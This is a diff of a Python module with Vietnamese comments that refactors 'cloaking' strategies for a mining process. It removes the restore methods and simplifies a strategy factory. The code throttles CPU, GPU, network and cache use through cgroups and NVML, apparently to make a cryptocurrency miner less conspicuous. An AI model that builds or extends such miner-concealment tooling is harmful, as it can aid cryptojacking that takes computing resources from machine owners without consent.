@@ -141,70 +141,6 @@ class CpuCloakStrategy(CloakStrategy):
             )
             raise
 
-    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
-        """
-        Khôi phục lại các giới hạn CPU ban đầu cho tiến trình đã cho.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn CPU ban đầu.
-        """
-        try:
-            pid = process.pid
-            process_name = process.name
-
-            cpu_cgroup = original_limits.get('cgroup')
-            original_cpu_quota_us = original_limits.get('cpu_quota_us')
-
-            if not cpu_cgroup:
-                self.logger.error(f"Không có thông tin cgroup CPU để khôi phục cho tiến trình {process_name} (PID: {pid}).")
-                return
-
-            # Khôi phục quota CPU thông qua CPUResourceManager
-            if original_cpu_quota_us:
-                success = self.cpu_resource_manager.set_cpu_quota(cpu_cgroup, original_cpu_quota_us, period=100000)
-                if success:
-                    self.logger.info(
-                        f"Khôi phục CPU quota là {original_cpu_quota_us}us cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cpu_cgroup}'."
-                    )
-                else:
-                    self.logger.error(
-                        f"Không thể khôi phục CPU quota là {original_cpu_quota_us}us cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cpu_cgroup}'."
-                    )
-
-            # Khôi phục affinity CPU nếu cần
-            if original_limits.get('cpu_affinity') and original_limits.get('cpu_threads'):
-                self.set_thread_affinity(pid, original_limits.get('cpu_affinity'), original_limits.get('cpu_threads'))
-                self.logger.info(
-                    f"Khôi phục CPU affinity cho tiến trình {process_name} (PID: {pid}) trong cgroup '{original_limits.get('cpu_affinity')}'."
-                )
-
-            # Xóa cgroup CPU nếu cần
-            self.cgroup_manager.delete_cgroup(cpu_cgroup)
-            self.logger.info(f"Đã xóa cgroup CPU '{cpu_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại khi khôi phục: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền để khôi phục cloaking CPU cho PID {process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi khi khôi phục cloaking CPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
-        """
-        Lấy PID và tên tiến trình từ đối tượng process.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-
-        Returns:
-            Tuple[int, str]: PID và tên tiến trình.
-        """
-        return process.pid, process.name
-
     def calculate_cpu_quota(self) -> int:
         """
         Tính toán quota CPU dựa trên throttle_percentage.
@@ -313,6 +249,18 @@ class CpuCloakStrategy(CloakStrategy):
         except ValueError as e:
             self.logger.error(f"Lỗi khi phân tích chuỗi CPUs '{cpus_str}': {e}")
         return cpus
+
+    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
+        """
+        Lấy PID và tên tiến trình từ đối tượng process.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình.
+
+        Returns:
+            Tuple[int, str]: PID và tên tiến trình.
+        """
+        return process.pid, process.name
 
 
 class GpuCloakStrategy(CloakStrategy):
@@ -512,89 +460,6 @@ class GpuCloakStrategy(CloakStrategy):
             )
             raise
 
-    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
-        """
-        Khôi phục lại các giới hạn GPU ban đầu cho tiến trình đã cho.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn GPU ban đầu.
-        """
-        try:
-            pid = process.pid
-            process_name = process.name
-
-            gpu_cgroup = original_limits.get('cgroup')
-            original_power_limit_w = original_limits.get('gpu_power_limit')
-            original_sm_clock = original_limits.get('target_sm_clock')
-            original_mem_clock = original_limits.get('target_mem_clock')
-
-            if not gpu_cgroup:
-                self.logger.error(f"Không có thông tin cgroup GPU để khôi phục cho tiến trình {process_name} (PID: {pid}).")
-                return
-
-            gpu_count = self.gpu_resource_manager.gpu_manager.gpu_count
-            if gpu_count == 0:
-                self.logger.warning("Không tìm thấy GPU nào trên hệ thống.")
-                return
-
-            gpu_index = self.assign_gpu(pid, gpu_count)
-            if gpu_index == -1:
-                self.logger.warning(
-                    f"Không thể gán GPU cho tiến trình {process_name} (PID: {pid}) để khôi phục."
-                )
-                return
-
-            handle = self.gpu_resource_manager.gpu_manager.get_handle(gpu_index)
-
-            # Khôi phục power limit thông qua GPUResourceManager
-            if original_power_limit_w:
-                try:
-                    self.gpu_resource_manager.set_gpu_power_limit(gpu_index, original_power_limit_w)
-                    self.logger.info(
-                        f"Khôi phục power limit GPU là {original_power_limit_w}W cho tiến trình {process_name} (PID: {pid}) trên GPU {gpu_index}."
-                    )
-                except pynvml.NVMLError as e:
-                    self.logger.error(
-                        f"Không thể khôi phục power limit GPU cho GPU {gpu_index} trên tiến trình {process_name} (PID: {pid}): {e}"
-                    )
-
-            # Khôi phục xung nhịp GPU (SM và Memory) thông qua GPUResourceManager
-            if original_sm_clock and original_mem_clock:
-                try:
-                    self.gpu_resource_manager.set_gpu_clocks(gpu_index, original_sm_clock, original_mem_clock)
-                    self.logger.info(
-                        f"Khôi phục xung nhịp GPU: SM={original_sm_clock}MHz, MEM={original_mem_clock}MHz "
-                        f"cho tiến trình {process_name} (PID: {pid}) trên GPU {gpu_index}."
-                    )
-                except pynvml.NVMLError as e:
-                    self.logger.warning(
-                        f"Không thể khôi phục xung nhịp GPU cho GPU {gpu_index} trên tiến trình {process_name} (PID: {pid}): {e}"
-                    )
-
-            # Khôi phục affinity CPU nếu cần
-            if original_limits.get('cpu_affinity') and original_limits.get('cpu_threads'):
-                self.set_thread_affinity(pid, original_limits.get('cpu_affinity'), original_limits.get('cpu_threads'))
-                self.logger.info(
-                    f"Khôi phục CPU affinity cho tiến trình {process_name} (PID: {pid}) trong cgroup '{original_limits.get('cpu_affinity')}'."
-                )
-
-            # Xóa cgroup GPU nếu cần
-            self.cgroup_manager.delete_cgroup(gpu_cgroup)
-            self.logger.info(f"Đã xóa cgroup GPU '{gpu_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
-
-        except pynvml.NVMLError as e:
-            self.logger.error(f"Lỗi NVIDIA Management Library khi khôi phục cloaking GPU: {e}")
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại khi khôi phục: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền để khôi phục cloaking GPU cho PID {process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi khi khôi phục cloaking GPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
     def assign_gpu(self, pid: int, gpu_count: int) -> int:
         """
         Gán GPU cho tiến trình dựa trên PID.
@@ -761,66 +626,6 @@ class NetworkCloakStrategy(CloakStrategy):
         except Exception as e:
             self.logger.error(
                 f"Lỗi khi áp dụng cloaking mạng cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
-        """
-        Khôi phục lại các giới hạn mạng ban đầu cho tiến trình đã cho.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn mạng ban đầu.
-        """
-        try:
-            pid = process.pid
-            process_name = process.name
-
-            network_cgroup = original_limits.get('cgroup')
-            original_classid = original_limits.get('net_cls.classid')
-
-            if not network_cgroup:
-                self.logger.error(f"Không có thông tin cgroup Network để khôi phục cho tiến trình {process_name} (PID: {pid}).")
-                return
-
-            # Khôi phục 'net_cls.classid' thông qua NetworkResourceManager
-            if original_classid:
-                success = self.network_resource_manager.set_classid(network_cgroup, original_classid)
-                if success:
-                    self.logger.info(
-                        f"Khôi phục 'net_cls.classid' là {original_classid} cho cgroup Network '{network_cgroup}'."
-                    )
-                else:
-                    self.logger.error(
-                        f"Không thể khôi phục 'net_cls.classid' cho cgroup Network '{network_cgroup}'."
-                    )
-
-            # Khôi phục băng thông mạng thông qua NetworkResourceManager
-            success = self.network_resource_manager.limit_bandwidth(
-                self.network_interface,
-                original_classid,
-                original_limits.get('bandwidth_reduction_mbps', 10)  # Giá trị mặc định nếu không có
-            )
-            if success:
-                self.logger.info(
-                    f"Khôi phục giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}) trên giao diện '{self.network_interface}'."
-                )
-            else:
-                self.logger.error(
-                    f"Không thể khôi phục giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}) trên giao diện '{self.network_interface}'."
-                )
-
-            # Xóa cgroup Network nếu cần
-            self.cgroup_manager.delete_cgroup(network_cgroup)
-            self.logger.info(f"Đã xóa cgroup Network '{network_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại khi khôi phục: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền để khôi phục cloaking mạng cho PID {process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi khi khôi phục cloaking mạng cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
@@ -1122,63 +927,6 @@ class CacheCloakStrategy(CloakStrategy):
             )
             raise
 
-    def restore(self, process: MiningProcess, original_limits: Dict[str, Any]) -> None:
-        """
-        Khôi phục lại các giới hạn Cache ban đầu cho tiến trình đã cho.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-            original_limits (Dict[str, Any]): Dictionary chứa các giới hạn Cache ban đầu.
-        """
-        try:
-            pid = process.pid
-            process_name = process.name
-
-            cache_cgroup = original_limits.get('cgroup')
-            original_cache_limit_bytes = original_limits.get('cache_limit_bytes')
-
-            if not cache_cgroup:
-                self.logger.error(f"Không có thông tin cgroup Cache để khôi phục cho tiến trình {process_name} (PID: {pid}).")
-                return
-
-            # Khôi phục giới hạn cache thông qua CacheResourceManager
-            if original_cache_limit_bytes:
-                success = self.cache_resource_manager.set_cache_limit(cache_cgroup, original_cache_limit_bytes)
-                if success:
-                    self.logger.info(
-                        f"Khôi phục giới hạn cache thành {original_cache_limit_bytes} bytes cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cache_cgroup}'."
-                    )
-                else:
-                    self.logger.error(
-                        f"Không thể khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}) trong cgroup '{cache_cgroup}'."
-                    )
-
-            # Xóa cgroup Cache nếu cần
-            self.cgroup_manager.delete_cgroup(cache_cgroup)
-            self.logger.info(f"Đã xóa cgroup Cache '{cache_cgroup}' cho tiến trình {process_name} (PID: {pid}).")
-
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại khi khôi phục Cache: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền để khôi phục cloaking Cache cho PID {process.pid}: {e}")
-        except Exception as e:
-            self.logger.error(
-                f"Lỗi bất ngờ khi khôi phục cloaking Cache cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-
-    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
-        """
-        Lấy PID và tên tiến trình từ đối tượng process.
-
-        Args:
-            process (MiningProcess): Đối tượng tiến trình.
-
-        Returns:
-            Tuple[int, str]: PID và tên tiến trình.
-        """
-        return process.pid, process.name
-
     def calculate_cache_limit(self) -> int:
         """
         Tính toán giới hạn cache dựa trên cache_limit_percent.
@@ -1199,6 +947,18 @@ class CacheCloakStrategy(CloakStrategy):
         """
         # Ví dụ: giả sử tổng cache là 8GB
         return 8 * 1024 * 1024 * 1024  # 8GB in bytes
+
+    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
+        """
+        Lấy PID và tên tiến trình từ đối tượng process.
+
+        Args:
+            process (MiningProcess): Đối tượng tiến trình.
+
+        Returns:
+            Tuple[int, str]: PID và tên tiến trình.
+        """
+        return process.pid, process.name
 
 
 class MemoryCloakStrategy(CloakStrategy):
@@ -1421,6 +1181,7 @@ class CloakStrategyFactory:
 
         if strategy_class and issubclass(strategy_class, CloakStrategy):
             try:
+                # Tạo instance của chiến lược cloaking dựa trên tên
                 if strategy_name.lower() == 'gpu':
                     gpu_resource_manager = resource_managers.get('gpu')
                     gpu_initialized = gpu_resource_manager.gpu_initialized if gpu_resource_manager else False
@@ -1432,47 +1193,19 @@ class CloakStrategyFactory:
                         gpu_resource_manager,
                         gpu_initialized
                     )
-                elif strategy_name.lower() == 'cpu':
+                elif strategy_name.lower() in ['cpu', 'network', 'disk_io', 'cache', 'memory']:
                     return strategy_class(
                         config,
                         logger,
                         cgroup_manager,
-                        resource_managers.get('cpu')
-                    )
-                elif strategy_name.lower() == 'network':
-                    return strategy_class(
-                        config,
-                        logger,
-                        cgroup_manager,
-                        resource_managers.get('network')
-                    )
-                elif strategy_name.lower() == 'disk_io':
-                    return strategy_class(
-                        config,
-                        logger,
-                        cgroup_manager,
-                        resource_managers.get('disk_io')
-                    )
-                elif strategy_name.lower() == 'cache':
-                    return strategy_class(
-                        config,
-                        logger,
-                        cgroup_manager,
-                        resource_managers.get('cache')
-                    )
-                elif strategy_name.lower() == 'memory':
-                    return strategy_class(
-                        config,
-                        logger,
-                        cgroup_manager,
-                        resource_managers.get('memory')
+                        resource_managers.get(strategy_name.lower())
                     )
                 else:
-                    # Các chiến lược khác có thể cần hoặc không cần CgroupManager
-                    return strategy_class(config, logger, cgroup_manager, resource_managers.get(strategy_name.lower()))
+                    logger.warning(f"Chiến lược cloaking '{strategy_name}' không được hỗ trợ.")
+                    return None
             except Exception as e:
-                logger.error(f"Lỗi khi tạo chiến lược '{strategy_name}': {e}")
-                raise
+                logger.error(f"Lỗi khi tạo chiến lược cloaking '{strategy_name}': {e}")
+                return None
         else:
             logger.warning(f"Không tìm thấy chiến lược cloaking: {strategy_name}")
             return None
